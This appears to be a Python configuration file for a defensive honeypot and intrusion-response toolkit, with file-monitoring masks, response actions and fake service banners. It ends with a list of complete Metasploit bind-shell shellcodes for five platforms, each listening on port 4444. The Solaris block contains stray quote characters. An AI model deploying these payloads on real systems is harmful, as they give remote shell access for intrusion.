FORMAT = 'utf-8'

# Inotify masks ------------------
IN_ACCESS = 0x00000001  # File was accessed
IN_MODIFY = 0x00000002  # File was modified
IN_ATTRIB = 0x00000004  # Metadata changed
IN_CLOSE_WRITE = 0x00000008  # Writtable file was closed
IN_CLOSE_NOWRITE = 0x00000010  # Unwrittable file closed
IN_OPEN = 0x00000020  # File was opened
IN_MOVED_FROM = 0x00000040  # File was moved from X
IN_MOVED_TO = 0x00000080  # File was moved to Y
IN_CREATE = 0x00000100  # Subfile was created
IN_DELETE = 0x00000200  # Subfile was deleted
IN_DELETE_SELF = 0x00000400  # Self was deleted
IN_ISDIR = 0x40000000  # event occurred against dir
IN_MOVE = IN_MOVED_FROM | IN_MOVED_TO
IN_CLOSE = IN_CLOSE_WRITE | IN_CLOSE_NOWRITE

# Actions masks ------------------
LOG_EVENT = 0x00000001  # log the event
SAVE_DATA = 0x00000002  # save to /var/adarch the file which called the event
KILL_PID = 0x00000004  # kill the pid that generated the event
KILL_USER = 0x00000008  # kill the user that generated the event
LOCK_USER = 0x00000010  # lock the user account
SHUTDOWN_HOST = 0x00000020  # shutdown host

# Active mode ----------------------
IMMEDIATE = 0
WAIT = 1

# Socket shutdown mode -----------------
SHUT_RD = 0
SHUT_WR = 1
SHUT_RDWR = 2

# BW LIST files ----------
BLACKLIST = "Environment/persistent/blacklist.txt"
WHITELIST = "Environment/persistent/whitelist.txt"

# SUB PROCESS workers ----------
MAX_WORKERS = 5

# LOG Information
LOG_FILE = "Environment/persistent/log.txt"

# CSV Analysis
CSV_FILE = "Environment/persistent/info.csv"

# Log levels ---------------------
DEBUG = 0
INFO = 1
WARNING = 2
ERROR = 3
CRITICAL = 4

# Attack levels --------------------
# Security range [0, 10]
AUTH = 1
BROADCAST = 1
BRUTE = 9
DEFAULT = 2
DISCOVERY = 4
DOS = 8
EXPLOIT = 9
EXTERNAL = 6
FUZZER = 1
INTRUSIVE = 7
MALWARE = 8
SAFE = 1
VERSION = 1
VULN = 1

# DATABASE
DB_Artillery = "Environment/persistent/artillery_integrity.db"
DB_Cryptolocked = "Environment/persistent/cryptolocked.db"
DB_Endlessh = "Environment/persistent/endlessh.db"
DB_Stealth = "Environment/persistent/stealthcryptolocked.db"

# Response message
MSG_endlessh = "SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2\n"
MSG_honeyports = "Connecting.."
MSG_inviports = "Protocol mismatch.\n"

# General parameter
ADMISSIBLE_ATTEMPTS = 10
FILELOG = "/var/log/auth.log"
N_TENTACTLES = 5
PORTS = [21, 80, 445]
SIGNATURES = "Environment/persistent/portspoof_signatures"
RANGE_OBS = 90  # minutes

# Filename
BIND_MOUNT = "Environment/scripts/bind_mount.sh"
BL_ELEMENT = "Environment/scripts/blacklist_element.sh"
LOAD_BL = "Environment/scripts/load_blacklist_rules.sh"
RESET_ALL = "Environment/scripts/reset_all.sh"
CONFIG = "Environment/persistent/config.json"

PAYLOADS = [
    #               linux/x86/shell_bind_tcp - 78 bytes
    #               http://www.metasploit.com
    #               InitialAutoRunScript=, PrependSetuid=false,
    #               PrependSetresuid=false, AutoRunScript=, AppendExit=false,
    #               VERBOSE=false, PrependSetreuid=false, RHOST=,
    #               PrependChrootBreak=false, LPORT=4444
    '''
                \x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80
                \x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a
                \x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0
                \x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f
                \x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0
                \x0b\xcd\x80''',

    #               osx/x86/shell_bind_tcp - 74 bytes
    #               http://www.metasploit.com
    #               InitialAutoRunScript=, PrependSetreuid=false,
    #               PrependSetresuid=false, RHOST=, AutoRunScript=, LPORT=4444,
    #               AppendExit=false, PrependSetuid=false, VERBOSE=false
    '''
                \x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02
                \x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89
                \x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58
                \xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f
                \x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80''',

    #               solaris/x86/shell_bind_tcp - 95 bytes
    #               http://www.metasploit.com
    #               InitialAutoRunScript=, AppendExit=false,
    #               PrependSetreuid=false, RHOST=, PrependSetuid=false,
    #               VERBOSE=false, AutoRunScript=, LPORT=4444
    '''
                \x68\xff\xd8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16\x31"
                \xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x6a\x02\x50\x50\x6a\x02"
                \x6a\x02\xb0\xe6\xff\xd6\x6a\x10\x57\x50\x31\xc0\xb0\xe8\xff"
                \xd6\x5b\x50\x50\x53\xb0\xe9\xff\xd6\xb0\xea\xff\xd6\x6a\x09"
                \x50\x6a\x3e\x58\xff\xd6\xff\x4f\xd8\x79\xf6\x50\x68\x2f\x2f"
                \x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x51"
                \x53\xb0\x3b\xff\xd6''',

    #               windows/shell_bind_tcp - 341 bytes
    #               http://www.metasploit.com
    #               EXITFUNC=process, RHOST=, VERBOSE=false, AutoRunScript=,
    #               InitialAutoRunScript=, LPORT=4444
    '''
                \xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30
                \x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff
                \x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2
                \xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85
                \xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3
                \x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d
                \x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58
                \x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b
                \x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff
                \xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68
                \x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01
                \x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50
                \x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7
                \x31\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68
                \xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5
                \x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7\x68\x75
                \x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57
                \x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01
                \x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e
                \x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56
                \x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56
                \x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75
                \x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5''',

    #               windows/x64/shell_bind_tcp - 505 bytes
    #               http://www.metasploit.com
    #               RHOST=, EXITFUNC=process, LPORT=4444, VERBOSE=false,
    #               InitialAutoRunScript=, AutoRunScript=
    '''
                \xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52
                \x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48
                \x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9
                \x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41
                \x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48
                \x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01
                \xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48
                \xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0
                \xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c
                \x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0
                \x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04
                \x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59
                \x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48
                \x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33
                \x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00
                \x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x00\x00\x00\x00\x41\x54
                \x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c
                \x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff
                \xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2
                \x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48
                \x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\xc2
                \xdb\x37\x67\xff\xd5\x48\x31\xd2\x48\x89\xf9\x41\xba\xb7\xe9
                \x38\xff\xff\xd5\x4d\x31\xc0\x48\x31\xd2\x48\x89\xf9\x41\xba
                \x74\xec\x3b\xe1\xff\xd5\x48\x89\xf9\x48\x89\xc7\x41\xba\x75
                \x6e\x4d\x61\xff\xd5\x48\x81\xc4\xa0\x02\x00\x00\x49\xb8\x63
                \x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57
                \x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44
                \x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6
                \x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff
                \xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5
                \x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff
                \xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48
                \x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13
                \x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5'''
]


